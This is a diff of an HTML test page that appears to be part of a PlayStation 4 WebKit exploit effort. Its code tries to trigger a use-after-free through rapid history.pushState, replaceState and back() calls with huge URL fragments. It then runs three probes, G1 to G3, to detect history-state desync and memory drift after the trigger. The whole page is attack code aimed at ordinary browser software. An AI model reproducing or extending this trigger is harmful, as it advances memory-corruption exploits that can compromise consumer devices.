@@ -1,159 +1,147 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – PASSO G (Internal Object Drift)</title>
+<title>PS4 WebKit – UAF Post-Trigger G Tests</title>
 <style>
-body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
-button { font-size:16px; padding:10px; margin:6px 0; width:100%; }
-#log { white-space:pre-wrap; margin-top:15px; border:1px solid #0f0; padding:10px; max-height:520px; overflow:auto; }
-.warn { color:#ff0; }
-.bad  { color:#f00; font-weight:bold; }
-.ok   { color:#0ff; }
+body { background:#000; color:#0f0; font-family:monospace; }
+button { font-size:16px; margin:10px; }
+pre { white-space:pre-wrap; }
 </style>
 </head>
-
 <body>
-<h2>PS4 WebKit – PASSO G: Internal History Object Drift</h2>
 
-<button onclick="runG1()">G1 — History Entry Integrity</button>
-<button onclick="runG2()">G2 — Fragment ↔ Entry Desync</button>
-<button onclick="runG3()">G3 — Temporal Reuse Probe</button>
-
-<div id="log"></div>
+<h2>PS4 WebKit – UAF Post-Trigger Integrity Tests (G1–G3)</h2>
+<button onclick="runAll()">RUN G TESTS</button>
+<pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m, cls=""){ 
-  const s=document.createElement("span");
-  if(cls) s.className=cls;
-  s.textContent=m+"\n";
-  logEl.appendChild(s);
-}
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+function log(m){ logEl.textContent += m + "\n"; }
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
-// ================================
-// UAF TRIGGER — CONFIRMADO
-// ================================
+/* ------------------------------
+   UAF TRIGGER (SINGLE EXECUTION)
+------------------------------- */
 async function triggerUAF(){
-  log("=== UAF TRIGGER START ===","warn");
-  let size = 977;
-  const STEP = 14461;
+    log("=== UAF TRIGGER START ===");
 
-  for(let i=0;i<48;i++){
-    let frag = "A".repeat(size);
-    history.pushState({i}, "", "#"+frag);
-    history.replaceState({i}, "", "#"+frag.slice(0, frag.length >> 1));
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(),0);
-      log(`[ITER ${i}] back() async`);
+    let size = 977;
+    const STEP = 14461;
+
+    for(let i=0;i<48;i++){
+        let frag = "A".repeat(size);
+        history.pushState({i}, "", "#"+frag);
+        history.replaceState({i}, "", "#"+frag.slice(0, frag.length >> 1));
+        if(i % 6 === 0){
+            setTimeout(()=>history.back(),0);
+            log(`[ITER ${i}] back() async`);
+        }
+        size += STEP;
+        await sleep(5);
     }
-    size += STEP;
-    await sleep(5);
-  }
 
-  log(">>> UAF WINDOW <<<","bad");
-  await sleep(2000);
+    log(">>> UAF WINDOW <<<");
+    await sleep(120);
 }
 
-// ================================
-// G1 — HISTORY ENTRY INTEGRITY
-// ================================
-async function runG1(){
-  logEl.textContent="";
-  log("=== G1 START: History Entry Integrity ===","warn");
+/* ------------------------------
+   G1 — HISTORY ENTRY INTEGRITY
+------------------------------- */
+async function testG1(){
+    log("\n=== G1 START: History Entry Integrity ===");
 
-  await triggerUAF();
+    let base = history.length;
+    log(`[G1] history.length initial = ${base}`);
 
-  log("[G1] Writing numbered states post-UAF");
-  for(let i=0;i<6;i++){
-    history.pushState({mark:i}, "", "#G1_"+i);
-  }
+    for(let i=0;i<8;i++){
+        history.pushState({g1:i}, "", "#G1_"+i);
+        await sleep(2);
+    }
 
-  log("[G1] Reading back states:");
-  let anomalies=0;
-  for(let i=0;i<6;i++){
-    history.back();
+    log(`[G1] history.length after push = ${history.length}`);
+    log(`[G1] history.state = ${JSON.stringify(history.state)}`);
+
+    log("=== G1 END ===");
+}
+
+/* ------------------------------
+   G2 — FRAGMENT / ENTRY DESYNC
+------------------------------- */
+async function testG2(){
+    log("\n=== G2 START: Fragment <-> Entry Desync ===");
+
+    let big = "B".repeat(120000);
+    location.hash = big;
+    await sleep(20);
+
+    let before = document.URL.length;
+    log(`[G2] URL.length before = ${before}`);
+
+    history.replaceState({x:1}, "", "#x");
     await sleep(10);
-    let st = history.state;
-    log(`  state=${JSON.stringify(st)}`);
-    if(!st || st.mark !== i){
-      anomalies++;
-      log("  >>> INTEGRITY DRIFT DETECTED","bad");
+
+    let after = document.URL.length;
+    log(`[G2] URL.length after = ${after}`);
+    log(`[G2] history.state = ${JSON.stringify(history.state)}`);
+
+    log(
+        after !== before
+        ? "[G2] URL length updated normally"
+        : "[G2] DESYNC DETECTED"
+    );
+
+    log("=== G2 END ===");
+}
+
+/* ------------------------------
+   G3 — TEMPORAL REUSE PROBE
+------------------------------- */
+async function testG3(){
+    log("\n=== G3 START: Temporal Reuse Probe ===");
+
+    let snapshot = [];
+    for(let i=0;i<5;i++){
+        snapshot.push({
+            len: document.URL.length,
+            c64: document.URL.charCodeAt(64),
+            c256: document.URL.charCodeAt(256)
+        });
+        await sleep(5);
     }
-  }
 
-  log(`[G1] history.length=${history.length}`);
-  log(`=== G1 END | anomalies=${anomalies} ===`, anomalies?"bad":"ok");
+    snapshot.forEach((s,i)=>{
+        log(`[G3][${i}] len=${s.len} c64=${s.c64} c256=${s.c256}`);
+    });
+
+    let stable = snapshot.every(
+        s => s.len === snapshot[0].len &&
+             s.c64 === snapshot[0].c64 &&
+             s.c256 === snapshot[0].c256
+    );
+
+    log(
+        stable
+        ? "[G3] Stable reuse (no temporal drift)"
+        : "[G3] TEMPORAL MEMORY DRIFT DETECTED"
+    );
+
+    log("=== G3 END ===");
 }
 
-// ================================
-// G2 — FRAGMENT ↔ ENTRY DESYNC
-// ================================
-async function runG2(){
-  logEl.textContent="";
-  log("=== G2 START: Fragment ↔ Entry Desync ===","warn");
-
-  await triggerUAF();
-
-  log("[G2] Setting large hash");
-  location.hash = "#"+("B".repeat(600000));
-  await sleep(20);
-
-  const lenBefore = document.URL.length;
-  log(`[G2] URL.length before=${lenBefore}`);
-
-  log("[G2] replaceState with small fragment");
-  history.replaceState({x:1}, "", "#S");
-  await sleep(20);
-
-  const lenAfter = document.URL.length;
-  log(`[G2] URL.length after=${lenAfter}`);
-
-  if(lenAfter === lenBefore){
-    log(">>> DESYNC: URL length unchanged after replaceState","bad");
-  } else {
-    log("URL length updated normally","ok");
-  }
-
-  log(`history.state=${JSON.stringify(history.state)}`);
-  log("=== G2 END ===");
+/* ------------------------------
+   MASTER SEQUENCE
+------------------------------- */
+async function runAll(){
+    logEl.textContent = "";
+    await triggerUAF();
+    await testG1();
+    await testG2();
+    await testG3();
+    log("\n=== ALL G TESTS COMPLETE ===");
 }
-
-// ================================
-// G3 — TEMPORAL REUSE PROBE
-// ================================
-async function runG3(){
-  logEl.textContent="";
-  log("=== G3 START: Temporal Reuse Probe ===","warn");
-
-  await triggerUAF();
-
-  log("[G3] Creating timeline entries");
-  for(let i=0;i<5;i++){
-    history.pushState({t:i}, "", "#T"+i);
-  }
-
-  log("[G3] Navigating back/forward");
-  history.back(); await sleep(20);
-  history.back(); await sleep(20);
-  history.forward(); await sleep(20);
-
-  const st = history.state;
-  log(`[G3] current state=${JSON.stringify(st)}`);
-
-  if(!st || typeof st.t !== "number"){
-    log(">>> TEMPORAL DRIFT / STALE ENTRY","bad");
-  } else {
-    log("State appears coherent","ok");
-  }
-
-  log(`[G3] history.length=${history.length}`);
-  log("=== G3 END ===");
-}
-
-log("Ready. Choose G1, G2 or G3.");
 </script>
+
 </body>
 </html>
+
